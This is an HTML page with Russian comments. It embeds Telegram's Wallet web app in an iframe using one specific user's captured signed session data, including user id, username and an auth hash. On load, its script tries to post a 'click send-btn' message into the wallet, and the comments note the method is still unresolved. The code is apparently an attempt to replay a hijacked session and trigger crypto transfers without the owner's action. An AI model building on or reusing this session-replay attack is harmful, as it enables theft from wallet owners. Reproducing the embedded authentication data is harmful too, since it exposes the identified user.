<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Wallet</title>
</head>
<body>
    <iframe id="telegram-wallet" src="https://walletbot.me/wv?ep=settings&staticVersion=9_0_2503&tgWebAppUserId=838151831#tgWebAppData=user%3D%257B%2522id%2522%253A838151831%252C%2522first_name%2522%253A%2522%25D0%2592%25D0%25BB%25D0%25B0%25D0%25B4%25D0%25B8%25D0%25BC%25D0%25B8%25D1%2580%2522%252C%2522last_name%2522%253A%2522%2522%252C%2522username%2522%253A%2522son_of_the_morning%2522%252C%2522language_code%2522%253A%2522ru%2522%252C%2522added_to_attachment_menu%2522%253Atrue%252C%2522allows_write_to_pm%2522%253Atrue%252C%2522photo_url%2522%253A%2522https%253A%255C%252F%255C%252Ft.me%255C%252Fi%255C%252Fuserpic%255C%252F320%255C%252FxUa0_d0u1xJeEf-wDdNQcEv56Ju-ueuiGP2oEzs2mdY.svg%2522%257D%26auth_date%3D1731053289%26hash%3D89f50b01a6f8cc60eae38657158ab522c526a1d41f2ed9f7ee86099b1b0e3daf&tgWebAppVersion=7.10&tgWebAppPlatform=web&tgWebAppBotInline=1&tgWebAppThemeParams=%7B%22bg_color%22%3A%22%23212121%22%2C%22button_color%22%3A%22%238774e1%22%2C%22button_text_color%22%3A%22%23ffffff%22%2C%22hint_color%22%3A%22%23aaaaaa%22%2C%22link_color%22%3A%22%238774e1%22%2C%22secondary_bg_color%22%3A%22%23181818%22%2C%22text_color%22%3A%22%23ffffff%22%2C%22header_bg_color%22%3A%22%23212121%22%2C%22accent_text_color%22%3A%22%238774e1%22%2C%22section_bg_color%22%3A%22%23212121%22%2C%22section_header_text_color%22%3A%22%238774e1%22%2C%22subtitle_text_color%22%3A%22%23aaaaaa%22%2C%22destructive_text_color%22%3A%22%23ff595a%22%7D" sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-modals allow-storage-access-by-user-activation" allow="camera; microphone; geolocation;" style="opacity: 1;" class="payment-verification" allowfullscreen=""></iframe>

    <script>
        // Ожидание загрузки iframe
        async function waitForElement(selector) {
            return new Promise(resolve => {
                const intervalId = setInterval(() => {
                    const element = document.querySelector(selector);
                    if (element) {
                        clearInterval(intervalId);
                        resolve(element);
                    }
                }, 100);
            });
        }

        // Функция для отправки сообщения в iframe
        async function sendTelegramMessage(message) {
            const iframe = document.getElementById('telegram-wallet');
            await waitForElement('#telegram-wallet'); 
            iframe.contentWindow.postMessage(message, '*');
        }

        // Запускаем функцию сразу при загрузке страницы
        async function openWallet() {
            // Ожидание загрузки iframe
            await waitForElement('#telegram-wallet');

            // Отправляем сообщение для нажатия на кнопку "send-btn" (нужно разобраться, как это сделать в Telegram API)
            await sendTelegramMessage({ 
                action: 'clickButton', 
                buttonId: 'send-btn' // Необходимо найти правильный ID кнопки
            });
        }

        openWallet();
    </script>
</body>
</html>
